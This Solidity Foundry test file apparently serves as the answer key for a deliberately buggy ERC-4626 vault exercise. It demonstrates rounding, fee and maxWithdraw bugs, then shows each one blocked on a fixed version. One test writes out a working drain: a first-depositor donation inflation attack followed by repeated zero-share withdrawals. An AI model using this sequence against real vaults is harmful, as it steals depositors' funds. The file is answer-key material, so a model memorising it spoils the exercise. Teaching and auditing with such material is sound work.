// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {FlexVault} from "../src/FlexVault.sol";
import {FlexVaultFixed} from "../src/FlexVaultFixed.sol";
import {MockToken} from "../src/Tokens.sol";

/// Proofs for ANSWERS.md. Each bug is shown on FlexVault, then shown not to work on FlexVaultFixed.
contract FlexVaultAnswersTest is Test {
    MockToken usd;
    FlexVault vault;      // the buggy one
    FlexVault fixedVault; // FlexVaultFixed, same functions, called through the same type
    address treasury = makeAddr("treasury");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address eve = makeAddr("eve"); // attacker

    function setUp() public {
        usd = new MockToken();
        vault = new FlexVault(usd, treasury);
        fixedVault = FlexVault(address(new FlexVaultFixed(usd, treasury)));
        address[3] memory people = [alice, bob, eve];
        for (uint256 i; i < 3; ++i) {
            usd.mint(people[i], 1_000_000e18);
            vm.startPrank(people[i]);
            usd.approve(address(vault), type(uint256).max);
            usd.approve(address(fixedVault), type(uint256).max);
            vm.stopPrank();
        }
        usd.mint(address(this), 1_000_000e18);
        usd.approve(address(vault), type(uint256).max);
        usd.approve(address(fixedVault), type(uint256).max);
    }

    // ---------------------------------------------------------------- Bug 1 + 2: rounding in the customer's favour
    // After interest, one share is worth 2 assets. Withdrawing 1 wei burns floor(0.5) = 0 shares and pays
    // floor(0.001) = 0 fee: free money, and fee-free. Each call is dust, but it's repeatable and it's a
    // broken invariant (assets left the vault, no shares burned).
    function _setUpInterest(FlexVault v) internal {
        vm.prank(alice);
        v.deposit(1_000e18, alice);
        v.addInterest(1_000e18); // share price now ~2
        vm.prank(bob);
        v.deposit(10, bob);      // bob gets ~5 shares
    }

    function test_bug1_withdrawBurnsZeroShares() public {
        _setUpInterest(vault);
        uint256 sharesBefore = vault.balanceOf(bob);
        vm.prank(bob);
        uint256 burned = vault.withdraw(1, bob, bob);
        assertEq(burned, 0, "withdrew 1 wei and burned nothing");
        assertEq(vault.balanceOf(bob), sharesBefore);
        assertEq(usd.balanceOf(treasury), 0, "and paid no fee");
    }

    function test_bug1_fixed_burnsAtLeastOneShare() public {
        _setUpInterest(fixedVault);
        vm.prank(bob);
        uint256 burned = fixedVault.withdraw(1, bob, bob);
        assertGt(burned, 0);
    }

    // ---------------------------------------------------------------- Bug 1 + 4 together: drain
    // With no _decimalsOffset, an attacker who is first in can make one share worth a fortune (deposit 1 wei,
    // donate a large amount). Then rounding down in previewWithdraw lets them withdraw just under a share's
    // value again and again while burning 0 shares, taking everyone else's money.
    function test_bug1and4_attackerDrainsVault() public {
        vm.startPrank(eve);
        vault.deposit(1, eve);                        // 1 share
        usd.transfer(address(vault), 10_000e18);      // donation: 1 share now worth 10,000
        vm.stopPrank();

        vm.prank(alice);
        vault.deposit(100_000e18, alice);              // alice gets ~9 shares (and already lost a bit to rounding)

        uint256 eveStart = usd.balanceOf(eve);
        vm.startPrank(eve);
        for (uint256 i; i < 400; ++i) {
            // Just under one share's worth, allowing for the 0.1% fee and OpenZeppelin's 1 virtual share.
            uint256 x = vault.totalAssets() * 990 / (1000 * (vault.totalSupply() + 1));
            if (x == 0 || vault.previewWithdraw(x) != 0) break;
            vault.withdraw(x, eve, eve);
        }
        vm.stopPrank();

        assertEq(vault.balanceOf(eve), 1, "eve still has her share");
        assertGt(usd.balanceOf(eve) - eveStart, 90_000e18, "and took most of alice's deposit");
    }

    function test_bug1and4_fixed_noFreeWithdrawals() public {
        vm.startPrank(eve);
        fixedVault.deposit(1, eve);
        usd.transfer(address(fixedVault), 10_000e18);
        vm.stopPrank();
        vm.prank(alice);
        fixedVault.deposit(100_000e18, alice);

        uint256 x = fixedVault.totalAssets() * 990 / (1000 * (fixedVault.totalSupply() + 1e6));
        assertGt(fixedVault.previewWithdraw(x), 0, "every withdrawal burns shares");
        // And the donation mostly went to waste: alice can still take back nearly all her deposit.
        assertGt(fixedVault.maxWithdraw(alice), 99_000e18);
    }

    // ---------------------------------------------------------------- Bug 3: maxWithdraw ignores the fee
    // ERC-4626 says withdraw(maxWithdraw(owner)) must not revert. Here it always does, because the fee needs
    // more shares than the customer has. Any app or aggregator that uses maxWithdraw for "withdraw all" breaks.
    function test_bug3_withdrawMaxReverts() public {
        vm.startPrank(alice);
        vault.deposit(1_000e18, alice);
        uint256 max = vault.maxWithdraw(alice);
        vm.expectRevert();
        vault.withdraw(max, alice, alice);
        vm.stopPrank();
    }

    function test_bug3_fixed_withdrawMaxWorks() public {
        vm.startPrank(alice);
        fixedVault.deposit(1_000e18, alice);
        fixedVault.withdraw(fixedVault.maxWithdraw(alice), alice, alice);
        vm.stopPrank();
        assertLe(fixedVault.balanceOf(alice), 1e6, "only rounding dust left");
    }
}
